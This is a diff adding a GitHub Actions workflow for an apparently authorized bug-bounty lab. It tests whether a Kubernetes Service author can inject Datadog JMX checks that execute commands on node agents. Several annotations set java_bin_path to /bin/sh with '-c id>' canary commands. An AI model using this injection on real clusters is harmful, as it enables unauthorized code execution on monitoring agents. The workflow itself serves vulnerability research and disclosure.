@@ -1,0 +1,483 @@
+name: dd-svcann-lab
+
+# Authorized self-owned lab. Proves whether a namespace-scoped Service author can
+# inject an autodiscovery check via the Service annotation
+# ad.datadoghq.com/service.checks and have the Datadog Cluster Agent dispatch it
+# to a node agent, and whether the JMX java_bin_path/java_options fields execute
+# a command there.
+#
+# Own org only (US1 Bugbounty-Whitfield). No target infrastructure. Canary files
+# inside the lab agent container only.
+
+on:
+  workflow_dispatch:
+    inputs:
+      agent_tag:
+        description: Datadog agent/cluster-agent image tag
+        default: "7.85.4"
+        required: false
+      chart_version:
+        description: Datadog helm chart version
+        default: "3.269.1"
+        required: false
+
+permissions:
+  contents: read
+
+jobs:
+  lab:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      LAB: ${{ github.workspace }}/lab
+      AGENT_TAG: ${{ inputs.agent_tag }}
+      CHART_VERSION: ${{ inputs.chart_version }}
+    steps:
+      - uses: actions/checkout@v4
+      - run: mkdir -p "$LAB/evidence"
+
+      - name: Install kind, kubectl, helm
+        run: |
+          set -eu
+          curl -fsSLo kind https://kind.sigs.k8s.io/dl/v0.27.0/kind-linux-amd64 && chmod +x kind && sudo install -m0755 kind /usr/local/bin/kind
+          curl -fsSLo kubectl https://dl.k8s.io/release/v1.32.0/bin/linux/amd64/kubectl && chmod +x kubectl && sudo install -m0755 kubectl /usr/local/bin/kubectl
+          curl -fsSL https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash >/dev/null
+          kind version | tee "$LAB/evidence/00-tools.txt"
+          kubectl version --client | tee -a "$LAB/evidence/00-tools.txt"
+          helm version | tee -a "$LAB/evidence/00-tools.txt"
+
+      - name: Create 2-node kind cluster
+        run: |
+          set -eu
+          cat > kind.yaml <<'EOF'
+          kind: Cluster
+          apiVersion: kind.x-k8s.io/v1alpha4
+          nodes:
+          - role: control-plane
+            image: kindest/node:v1.32.0
+          - role: worker
+            image: kindest/node:v1.32.0
+          EOF
+          kind create cluster --name dd-svcann --config kind.yaml --wait 240s
+          kubectl get nodes -o wide | tee "$LAB/evidence/00-nodes.txt"
+
+      - name: Tenant namespaces, minimal Service-author RBAC, evidence curl pod
+        run: |
+          set -eu
+          kubectl create namespace tenant-a
+          kubectl create namespace customer
+          kubectl create namespace evidence
+          cat > author-rbac.yaml <<'EOF'
+          apiVersion: v1
+          kind: ServiceAccount
+          metadata:
+            name: svc-author
+            namespace: tenant-a
+          ---
+          apiVersion: rbac.authorization.k8s.io/v1
+          kind: Role
+          metadata:
+            name: svc-create
+            namespace: tenant-a
+          rules:
+          - apiGroups: [""]
+            resources: ["services"]
+            verbs: ["create"]
+          ---
+          apiVersion: rbac.authorization.k8s.io/v1
+          kind: RoleBinding
+          metadata:
+            name: svc-create
+            namespace: tenant-a
+          subjects:
+          - kind: ServiceAccount
+            name: svc-author
+            namespace: tenant-a
+          roleRef:
+            kind: Role
+            name: svc-create
+            apiGroup: rbac.authorization.k8s.io
+          EOF
+          kubectl apply -f author-rbac.yaml
+          {
+            echo "=== svc-author full permission list in tenant-a ==="
+            kubectl auth can-i --list -n tenant-a --as=system:serviceaccount:tenant-a:svc-author
+            echo
+            echo "=== point checks ==="
+            for verb in create get list delete; do
+              for res in services pods secrets configmaps deployments daemonsets; do
+                printf '%-7s %-14s %s\n' "$verb" "$res" "$(kubectl auth can-i "$verb" "$res" -n tenant-a --as=system:serviceaccount:tenant-a:svc-author)"
+              done
+            done
+            echo
+            echo "=== cross-namespace (customer) ==="
+            for verb in create get list; do
+              for res in services pods secrets; do
+                printf '%-7s %-10s customer: %s\n' "$verb" "$res" "$(kubectl auth can-i "$verb" "$res" -n customer --as=system:serviceaccount:tenant-a:svc-author)"
+              done
+            done
+            echo
+            echo "=== cluster-scoped ==="
+            kubectl auth can-i create nodes --as=system:serviceaccount:tenant-a:svc-author
+          } | tee "$LAB/evidence/02-rbac.txt"
+          # Evidence collector lives outside tenant-a; tenant-a stays pod-free.
+          kubectl -n evidence run curl --image=curlimages/curl:8.10.1 --restart=Never --command -- sleep 7200
+          kubectl -n evidence wait --for=condition=Ready pod/curl --timeout=180s
+
+      - name: Install Datadog chart (cluster checks enabled, DCA on control-plane, agents on worker)
+        env:
+          DD_API_KEY: ${{ secrets.DD_API_KEY }}
+          DD_APP_KEY: ${{ secrets.DD_APP_KEY }}
+        run: |
+          set -eu
+          umask 077
+          helm repo add datadog https://helm.datadoghq.com >/dev/null
+          helm repo update >/dev/null
+          cat > values.yaml <<'EOF'
+          registry: registry.datadoghq.com
+          datadog:
+            apiKey: __DD_API_KEY__
+            appKey: __DD_APP_KEY__
+            site: datadoghq.com
+            clusterName: dd-svcann-lab
+            logLevel: debug
+            kubelet:
+              tlsVerify: false
+            logs:
+              enabled: false
+            apm:
+              portEnabled: false
+            processAgent:
+              containerCollection: false
+              processCollection: false
+            orchestratorExplorer:
+              enabled: false
+            clusterChecks:
+              enabled: true
+          clusterAgent:
+            enabled: true
+            replicas: 1
+            image:
+              tag: __AGENT_TAG__
+            nodeSelector:
+              kubernetes.io/hostname: dd-svcann-control-plane
+            tolerations:
+            - key: node-role.kubernetes.io/control-plane
+              operator: Exists
+              effect: NoSchedule
+          agents:
+            image:
+              tag: __AGENT_TAG__
+            nodeSelector:
+              kubernetes.io/hostname: dd-svcann-worker
+            containers:
+              agent:
+                logLevel: debug
+          EOF
+          sed -i "s|__DD_API_KEY__|$DD_API_KEY|; s|__DD_APP_KEY__|$DD_APP_KEY|; s|__AGENT_TAG__|$AGENT_TAG|g" values.yaml
+          helm install datadog-agent datadog/datadog --version "$CHART_VERSION" -f values.yaml -n datadog --create-namespace --wait --timeout 12m || true
+          kubectl -n datadog get pods -o wide | tee "$LAB/evidence/01-pods.txt"
+          kubectl -n datadog get deploy,ds -o wide | tee -a "$LAB/evidence/01-pods.txt"
+          kubectl -n datadog get deploy -o name | tee "$LAB/evidence/01-dca-name.txt"
+          kubectl -n datadog get ds -o name | tee "$LAB/evidence/01-ds-name.txt"
+
+      - name: Wait for DCA and node agent
+        run: |
+          set -eu
+          kubectl -n datadog wait --for=condition=Ready pod -l app.kubernetes.io/component=cluster-agent --timeout=300s
+          kubectl -n datadog wait --for=condition=Ready pod -l app.kubernetes.io/component=agent --timeout=300s
+          kubectl -n datadog get pods -o wide | tee "$LAB/evidence/01-pods-ready.txt"
+
+      - name: Capability and configuration baseline
+        run: |
+          set -eu
+          DCA_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=cluster-agent -o jsonpath='{.items[0].metadata.name}')
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          echo "DCA_POD=$DCA_POD" | tee "$LAB/evidence/01-env.txt"
+          echo "AGENT_POD=$AGENT_POD" | tee -a "$LAB/evidence/01-env.txt"
+          {
+            echo "=== datadog-cluster-agent env (selected) ==="
+            kubectl -n datadog exec "$DCA_POD" -c cluster-agent -- sh -c 'printenv DD_CLUSTER_CHECKS_ENABLED DD_EXTRA_CONFIG_PROVIDERS DD_EXTRA_LISTENERS; echo "token_len=$(printenv DD_CLUSTER_AGENT_AUTH_TOKEN | wc -c)"'
+            echo
+            echo "=== node agent env (selected) ==="
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'printenv DD_CLUSTER_CHECKS_ENABLED DD_EXTRA_CONFIG_PROVIDERS DD_INTEGRATION_IGNORE_UNTRUSTED_FILE_PARAMS; echo "token_len=$(printenv DD_CLUSTER_AGENT_AUTH_TOKEN | wc -c)"'
+            echo
+            echo "=== node agent identity ==="
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- id
+            echo
+            echo "=== node agent hostPID / host mounts ==="
+            kubectl -n datadog get pod "$AGENT_POD" -o jsonpath='{.spec.hostPID}{"\n"}'
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'grep -E " /host/| /etc/passwd " /proc/mounts | head -20'
+            echo
+            echo "=== jmxfetch jar / java presence (standard image) ==="
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l /opt/datadog-agent/bin/agent/dist/jmx/jmxfetch.jar 2>&1; command -v java 2>&1; ls -l /bin/sh'
+          } | tee -a "$LAB/evidence/01-env.txt"
+
+      - name: Baseline - plain Service and benign http_check Service author injection
+        run: |
+          set -eu
+          DCA_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=cluster-agent -o jsonpath='{.items[0].metadata.name}')
+          dca_state() {
+            TOKEN=$(kubectl -n datadog exec "$DCA_POD" -c cluster-agent -- printenv DD_CLUSTER_AGENT_AUTH_TOKEN)
+            kubectl -n evidence exec curl -- curl -sk -m 20 -H "Authorization: Bearer $TOKEN" https://datadog-cluster-agent.datadog.svc:5005/api/v1/clusterchecks
+          }
+          cat > svc-plain.yaml <<'EOF'
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: svc-plain
+            namespace: tenant-a
+          spec:
+            selector:
+              app: nonexistent
+            ports:
+            - port: 80
+          EOF
+          cat > svc-http.yaml <<'EOF'
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: svc-http
+            namespace: tenant-a
+            annotations:
+              ad.datadoghq.com/service.checks: |
+                {"http_check":{"instances":[{"name":"svcann-canary","url":"http://127.0.0.1:1/","timeout":1}]}}
+          spec:
+            selector:
+              app: nonexistent
+            ports:
+            - port: 80
+          EOF
+          kubectl create -f svc-plain.yaml --as=system:serviceaccount:tenant-a:svc-author
+          kubectl create -f svc-http.yaml --as=system:serviceaccount:tenant-a:svc-author
+          kubectl -n tenant-a get svc svc-plain svc-http -o yaml > "$LAB/evidence/10-services-created.yaml"
+          sleep 45
+          dca_state > "$LAB/evidence/10-http-state.json" 2>&1 || true
+          python3 - <<'PY' | tee "$LAB/evidence/10-http-state-summary.txt"
+          import json
+          try:
+              d=json.load(open("lab/evidence/10-http-state.json"))
+          except Exception as e:
+              print("state not parseable as json:", e); raise SystemExit
+          print("warmup:", d.get("warmup"), "dangling:", len(d.get("dangling") or []))
+          for n in d.get("nodes") or []:
+              for c in n.get("configs") or []:
+                  cfg=c.get("config",{})
+                  print("node", n.get("name"), "->", cfg.get("name"), "src", cfg.get("source"), "cluster_check", cfg.get("cluster_check"))
+          PY
+          {
+            echo "=== DCA dispatch log (svc-http / http_check) ==="
+            kubectl -n datadog logs "$DCA_POD" -c cluster-agent --tail=4000 | grep -Ei "kube_services|Dispatching configuration|http_check|svc-http|svc-plain" | tail -40
+            echo
+            echo "=== node agent log (http_check execution) ==="
+            kubectl -n datadog logs -l app.kubernetes.io/component=agent --tail=6000 --prefix | grep -Ei "http_check|svcann-canary|svc-http|cluster" | tail -40
+          } > "$LAB/evidence/11-http-logs.txt" 2>&1 || true
+          cat "$LAB/evidence/11-http-logs.txt"
+
+      - name: TEST A - JMX java_bin_path via Service annotation (gate default/off)
+        run: |
+          set -eu
+          DCA_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=cluster-agent -o jsonpath='{.items[0].metadata.name}')
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          kubectl -n tenant-a delete svc svc-plain svc-http --ignore-not-found
+          sleep 30
+          cat > svc-jmx.yaml <<'EOF'
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: svc-jmx
+            namespace: tenant-a
+            annotations:
+              ad.datadoghq.com/service.checks: |
+                {"jmx":{"instances":[{"loader":"jmx","java_bin_path":"/bin/sh","java_options":"-c id>/tmp/svc-ann-marker"}]}}
+          spec:
+            selector:
+              app: nonexistent
+            ports:
+            - port: 80
+          EOF
+          kubectl create -f svc-jmx.yaml --as=system:serviceaccount:tenant-a:svc-author
+          echo "created svc-jmx as svc-author" | tee "$LAB/evidence/20-jmx.txt"
+          kubectl -n tenant-a get svc svc-jmx -o yaml | tee -a "$LAB/evidence/20-jmx.txt"
+          sleep 90
+          TOKEN=$(kubectl -n datadog exec "$DCA_POD" -c cluster-agent -- printenv DD_CLUSTER_AGENT_AUTH_TOKEN)
+          kubectl -n evidence exec curl -- curl -sk -m 20 -H "Authorization: Bearer $TOKEN" https://datadog-cluster-agent.datadog.svc:5005/api/v1/clusterchecks > "$LAB/evidence/20-jmx-state.json" 2>&1 || true
+          {
+            echo "=== DCA state after svc-jmx ==="
+            cat "$LAB/evidence/20-jmx-state.json"
+            echo
+            echo "=== DCA dispatch log ==="
+            kubectl -n datadog logs "$DCA_POD" -c cluster-agent --tail=4000 | grep -Ei "Dispatching configuration|svc-jmx|jmx" | tail -30
+            echo
+            echo "=== node agent JMX scheduler log ==="
+            kubectl -n datadog logs -l app.kubernetes.io/component=agent --tail=8000 --prefix | grep -Ei "Scheduling jmxfetch|Args:|svc-ann-marker|jmx_|jmxfetch" | tail -40
+            echo
+            echo "=== marker on node agent ==="
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l /tmp/svc-ann-marker 2>&1; echo "---content---"; cat /tmp/svc-ann-marker 2>&1'
+          } | tee -a "$LAB/evidence/20-jmx.txt"
+
+      - name: TEST B - negative control, JMX without java_bin_path (fresh agent)
+        run: |
+          set -eu
+          DS=$(kubectl -n datadog get ds -o jsonpath='{.items[0].metadata.name}')
+          AGENT_POD_OLD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          kubectl -n tenant-a delete svc svc-jmx --ignore-not-found
+          kubectl -n datadog rollout restart "ds/$DS"
+          kubectl -n datadog rollout status "ds/$DS" --timeout=300s
+          sleep 20
+          cat > svc-jmx-nobin.yaml <<'EOF'
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: svc-jmx-nobin
+            namespace: tenant-a
+            annotations:
+              ad.datadoghq.com/service.checks: |
+                {"jmx":{"instances":[{"loader":"jmx","java_options":"-c id>/tmp/svc-ann-marker-nobin"}]}}
+          spec:
+            selector:
+              app: nonexistent
+            ports:
+            - port: 80
+          EOF
+          kubectl create -f svc-jmx-nobin.yaml --as=system:serviceaccount:tenant-a:svc-author
+          sleep 90
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          {
+            echo "old agent pod: $AGENT_POD_OLD"
+            echo "new agent pod: $AGENT_POD"
+            echo "=== node agent JMX log (expect exec of default 'java', absent in standard image) ==="
+            kubectl -n datadog logs "$AGENT_POD" -c agent --tail=8000 | grep -Ei "Scheduling jmxfetch|Args:|svc-ann-marker|exec|java|jmxfetch" | tail -40
+            echo
+            echo "=== marker (expect absent) ==="
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l /tmp/svc-ann-marker-nobin 2>&1; cat /tmp/svc-ann-marker-nobin 2>&1'
+          } | tee "$LAB/evidence/30-nobin.txt"
+
+      - name: TEST C - gate ON, JMX via Service annotation (fresh agent)
+        run: |
+          set -eu
+          DS=$(kubectl -n datadog get ds -o jsonpath='{.items[0].metadata.name}')
+          kubectl -n tenant-a delete svc svc-jmx-nobin --ignore-not-found
+          kubectl -n datadog set env "ds/$DS" DD_INTEGRATION_IGNORE_UNTRUSTED_FILE_PARAMS=true
+          kubectl -n datadog rollout status "ds/$DS" --timeout=300s
+          sleep 20
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          echo "agent pod: $AGENT_POD" | tee "$LAB/evidence/40-gate.txt"
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- printenv DD_INTEGRATION_IGNORE_UNTRUSTED_FILE_PARAMS | tee -a "$LAB/evidence/40-gate.txt"
+          cat > svc-jmx-gate.yaml <<'EOF'
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: svc-jmx-gate
+            namespace: tenant-a
+            annotations:
+              ad.datadoghq.com/service.checks: |
+                {"jmx":{"instances":[{"loader":"jmx","java_bin_path":"/bin/sh","java_options":"-c id>/tmp/svc-ann-marker-gate"}]}}
+          spec:
+            selector:
+              app: nonexistent
+            ports:
+            - port: 80
+          EOF
+          kubectl create -f svc-jmx-gate.yaml --as=system:serviceaccount:tenant-a:svc-author
+          sleep 90
+          {
+            echo "=== node agent JMX log (gate ON) ==="
+            kubectl -n datadog logs "$AGENT_POD" -c agent --tail=8000 | grep -Ei "Scheduling jmxfetch|Args:|svc-ann-marker|jmxfetch" | tail -40
+            echo
+            echo "=== marker (gate ON) ==="
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l /tmp/svc-ann-marker-gate 2>&1; echo ---; cat /tmp/svc-ann-marker-gate 2>&1'
+          } | tee -a "$LAB/evidence/40-gate.txt"
+
+      - name: TEST D - alternate channel, endpoint annotation on Endpoints object
+        run: |
+          set -eu
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          kubectl -n tenant-a delete svc svc-jmx-gate --ignore-not-found
+          kubectl -n tenant-a run ep-target --image=registry.k8s.io/pause:3.9 --restart=Never --labels=app=ep-target
+          kubectl -n tenant-a wait --for=condition=Ready pod/ep-target --timeout=180s
+          cat > ep-svc.yaml <<'EOF'
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: ep-svc
+            namespace: tenant-a
+          spec:
+            selector:
+              app: ep-target
+            ports:
+            - port: 80
+              targetPort: 80
+          EOF
+          kubectl create -f ep-svc.yaml --as=system:serviceaccount:tenant-a:svc-author
+          kubectl -n tenant-a annotate endpoints ep-svc 'ad.datadoghq.com/endpoints.checks={"jmx":{"instances":[{"loader":"jmx","java_bin_path":"/bin/sh","java_options":"-c id>/tmp/svc-ann-marker-ep"}]}}' --overwrite | tee "$LAB/evidence/50-endpoint.txt"
+          kubectl -n tenant-a get endpoints ep-svc -o yaml | tee -a "$LAB/evidence/50-endpoint.txt"
+          sleep 90
+          {
+            echo "=== node agent JMX log (endpoints annotation) ==="
+            kubectl -n datadog logs "$AGENT_POD" -c agent --tail=10000 | grep -Ei "Scheduling jmxfetch|Args:|svc-ann-marker-ep|endpoint" | tail -40
+            echo
+            echo "=== marker (endpoints annotation) ==="
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l /tmp/svc-ann-marker-ep 2>&1; echo ---; cat /tmp/svc-ann-marker-ep 2>&1'
+          } | tee -a "$LAB/evidence/50-endpoint.txt"
+
+      - name: TEST E - known control, pod annotation JMX
+        run: |
+          set -eu
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          cat > pod-ann.yaml <<'EOF'
+          apiVersion: v1
+          kind: Pod
+          metadata:
+            name: pod-ann
+            namespace: tenant-a
+            labels:
+              app: pod-ann
+            annotations:
+              ad.datadoghq.com/podann.checks: |
+                {"jmx":{"instances":[{"loader":"jmx","java_bin_path":"/bin/sh","java_options":"-c id>/tmp/svc-ann-marker-pod"}]}}
+          spec:
+            containers:
+            - name: podann
+              image: registry.k8s.io/pause:3.9
+          EOF
+          kubectl apply -f pod-ann.yaml
+          kubectl -n tenant-a wait --for=condition=Ready pod/pod-ann --timeout=180s
+          sleep 90
+          {
+            echo "=== node agent JMX log (pod annotation control) ==="
+            kubectl -n datadog logs "$AGENT_POD" -c agent --tail=10000 | grep -Ei "Scheduling jmxfetch|Args:|svc-ann-marker-pod" | tail -30
+            echo
+            echo "=== marker (pod annotation control) ==="
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l /tmp/svc-ann-marker-pod 2>&1; echo ---; cat /tmp/svc-ann-marker-pod 2>&1'
+          } | tee -a "$LAB/evidence/60-podann.txt"
+
+      - name: Final state and cleanup
+        if: always()
+        run: |
+          set +e
+          DCA_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=cluster-agent -o jsonpath='{.items[0].metadata.name}')
+          TOKEN=$(kubectl -n datadog exec "$DCA_POD" -c cluster-agent -- printenv DD_CLUSTER_AGENT_AUTH_TOKEN)
+          kubectl -n evidence exec curl -- curl -sk -m 20 -H "Authorization: Bearer $TOKEN" https://datadog-cluster-agent.datadog.svc:5005/api/v1/clusterchecks > "$LAB/evidence/99-final-state.json" 2>&1
+          kubectl -n datadog get pods -o wide > "$LAB/evidence/99-final-pods.txt" 2>&1
+          kubectl -n tenant-a get svc,pods,endpoints > "$LAB/evidence/99-final-tenant.txt" 2>&1
+          python3 - <<'PY'
+          import glob, re
+          for p in glob.glob("lab/evidence/*"):
+              try:
+                  s=open(p, errors="ignore").read()
+              except Exception:
+                  continue
+              s=re.sub(r'(api_key["\']?\s*[:=]\s*["\']?)[A-Za-z0-9]{20,}', r'\1<REDACTED>', s)
+              s=re.sub(r'(app_key["\']?\s*[:=]\s*["\']?)[A-Za-z0-9]{20,}', r'\1<REDACTED>', s)
+              open(p,"w").write(s)
+          PY
+          kubectl -n tenant-a delete pod,svc --all --ignore-not-found >/dev/null 2>&1
+          echo done
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: svcann-evidence
+          path: lab/evidence
